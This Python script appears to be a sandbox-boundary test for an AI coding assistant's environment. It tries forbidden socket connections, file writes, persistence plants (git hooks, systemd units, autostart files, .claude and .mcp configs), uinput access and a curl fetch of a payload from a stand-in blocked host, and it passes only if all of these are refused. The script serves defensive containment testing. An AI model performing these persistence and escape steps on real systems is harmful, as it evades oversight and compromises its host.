"""Fixed hostile programs. An exception alone is not proof: check.py also
checks listener arrivals, file hashes, positive controls and the canary count.
"""
import json
import errno
import os
from pathlib import Path
import socket
import subprocess

fixtures = json.loads(Path('/opt/aresos-control/fixtures.json').read_text())
results = []
assert Path('/home/assistant/work/.envrc').read_text() == 'synthetic fixture\n'
print('WORK_READ_OK', flush=True)
print('SANDBOX_IDENTITY ' + json.dumps({
    'namespaces': {n: os.readlink('/proc/self/ns/' + n) for n in ('net', 'mnt')},
    'seccomp': [s for s in Path('/proc/self/status').read_text().splitlines()
                if s.startswith(('Seccomp:', 'Seccomp_filters:'))],
}), flush=True)


def attempt(name, operation):
    try:
        operation()
    except OSError as error:
        row = {'name': name, 'blocked': error.errno in (errno.EPERM, errno.EACCES, errno.EROFS, errno.ENOENT, errno.ECONNREFUSED), 'errno': error.errno, 'error': str(error),
               'classification': 'hidden' if error.errno == errno.ENOENT else 'refused'}
    else:
        row = {'name': name, 'blocked': False}
    results.append(row)
    print('HOSTILE ' + json.dumps(row), flush=True)


def connect(address, family=socket.AF_UNIX):
    with socket.socket(family, socket.SOCK_STREAM) as client:
        client.settimeout(3)
        client.connect(address)


def append(path):
    with open(path, 'ab') as output:
        output.write(b'HOSTILE-CODE\n')


def modify_existing(path):
    # O_CREAT would instead create an unrelated shadow file in a hidden home.
    # Exercise modification of the existing execution target; separately prove
    # shadow creation cannot change its real counterpart (below and check.py).
    descriptor = os.open(path, os.O_WRONLY | os.O_APPEND)
    with os.fdopen(descriptor, 'wb') as output:
        output.write(b'HOSTILE-CODE\n')


for name, address in fixtures['sockets'].items():
    attempt('connect:' + name, lambda a=address: connect('\0' + a[1:] if a.startswith('@') else a))
attempt('connect:vsock', lambda: connect((socket.VMADDR_CID_HOST, 18080), socket.AF_VSOCK))
# A symlink must not provide a second spelling for a hidden socket.
attempt('connect:act-alias', lambda: connect('/home/assistant/work/act-alias.sock'))
for path in fixtures['reads']:
    attempt('read:' + path, lambda p=path: Path(p).read_bytes())
for path in fixtures['writes']:
    attempt('write:' + path, lambda p=path: modify_existing(p))
    attempt('unlink:' + path, lambda p=path: Path(p).unlink())
    attempt('replace:' + path, lambda p=path: os.replace(p + '.boundary-replacement', p))
# Existing parent, absent child: denying only today's file is insufficient.
new_paths = [
    '/home/assistant/.config/autostart/new.desktop',
    '/home/assistant/.config/systemd/user/new.service',
    '/home/assistant/work/.git/hooks/new-hook',
    '/home/assistant/work/.claude/new.json',
    '/home/assistant/work/nested/.claude/new.json',
    '/home/assistant/work/.vscode/new.json',
]
for path in new_paths:
    attempt('create:' + path, lambda p=path: append(p))


def fresh_configuration(relative):
    target = Path('/home/assistant/work/fresh') / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    append(target)


for path in ['.envrc', '.claude/settings.json', '.git/hooks/pre-commit',
             '.git/config', '.mcp.json', '.vscode/tasks.json']:
    attempt('fresh:' + path, lambda p=path: fresh_configuration(p))

# This pathname now names only a tmpfs shadow, never the owner's startup file.
# Deliberately succeed here and let the outside supervisor verify the original.
shadow = Path('/home/assistant/.bashrc')
shadow.write_text('SHADOW_ONLY_NEVER_EXECUTE\n')
assert shadow.read_text() == 'SHADOW_ONLY_NEVER_EXECUTE\n'
print('SHADOW_ONLY /home/assistant/.bashrc', flush=True)

attempt('input:uinput', lambda: os.close(os.open('/dev/uinput', os.O_WRONLY)))
attempt('network:direct', lambda: connect(('127.0.0.1', 18080), socket.AF_INET))
for name, args in [
    ('proxy-http', ['http://blocked.boundary.test:18080/payload']),
    ('proxy-connect', ['--proxytunnel', 'http://blocked.boundary.test:18080/payload']),
]:
    command = ['curl', '--silent', '--show-error', '--fail', '--max-time', '5', *args]
    probe = subprocess.run(command, capture_output=True, text=True)
    row = {'name': 'network:' + name, 'blocked': probe.returncode == 22 and '403' in probe.stderr,
           'exit': probe.returncode, 'stderr': probe.stderr.strip()}
    results.append(row)
    print('HOSTILE ' + json.dumps(row), flush=True)

# Proves arbitrary harmless code really ran. Shell writes are confined to temp:
# Linux denyWrite cannot express recursive config exclusions in a writable tree.
Path('/tmp/claude').mkdir(exist_ok=True)
Path('/tmp/claude/positive-control').write_text('sandbox executed\n')
assert Path('/tmp/claude/positive-control').read_text() == 'sandbox executed\n'
print('TEMP_WRITE_OK', flush=True)
print('HOSTILE_DONE ' + str(len(results)), flush=True)
raise SystemExit(0 if all(row['blocked'] for row in results) else 1)
